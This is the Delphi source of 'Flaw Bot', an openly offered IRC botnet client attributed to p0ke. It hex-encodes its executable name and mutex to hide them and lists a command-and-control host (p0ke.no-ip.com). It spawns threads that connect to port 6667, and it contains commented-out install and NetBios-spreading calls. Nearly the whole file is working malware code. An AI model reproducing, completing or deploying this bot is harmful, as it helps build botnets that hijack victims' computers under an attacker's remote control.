   {

     Flaw Bot made by p0ke.
     Open-Source bot for BotNet 1.0.1

     MultiThreaded, can connect to more then 1 server.

     Use this at your own risk, the author(s) cannot
     be held responsible for any actions nor damage
     made / taken by this application.

   }

   program Flaw;

   uses
     Windows,
     uNetBios,
     Unit1 in 'Unit1.pas';

   {
   Hex Table.
   a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z  .  -  _  0  1  2  3  4  5  6  7  8  9  ~  ?
   61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 2E 2D 5F 30 31 32 33 34 35 36 37 38 39 7E 3F
   }

   const
     flaw_filename :Array[0..7]  Of Byte = ($66, $6C, $61, $77, $2E, $65, $78, $65);
     flaw_mutex    :Array[0..15] Of Byte = ($66, $6C, $61, $77, $2D, $76, $65, $72, $73, $69, $6F, $6E, $2D, $31, $2E, $30);
     Servers       :Array[0..MAX_SERVERS] Of String =
     ('127.0.0.1','p0ke.no-ip.com');

   var
     filename      :  String;
     mutex         :  String;
     i             :  Integer;
     D             :  Dword;
     Msg           :  TMsg;

   begin

     Sleep(5000);

     filename := '';
     For I := 0 To 7 Do
       filename := filename+chr(flaw_filename[i]);

     mutex := '';
     For I := 0 To 15 Do
       mutex := mutex+chr(flaw_mutex[i]);

     {
     Install(Filename, Mutex);
     StartNetBios(255);
     }

     ZeroMemory(@I, SizeOf(I));
     For I := 0 To 1 Do
     Begin
       Data[i].IP := Servers[0];
       Data[i].Port := 6667;
       CreateThread(NIL, 0, @StartBot, @Data[i], 0, D);
   //    Sleep(500);
     End;

     While GetMessage(Msg, 0, 0, 0) Do DisPatchMessage(Msg);

   end.
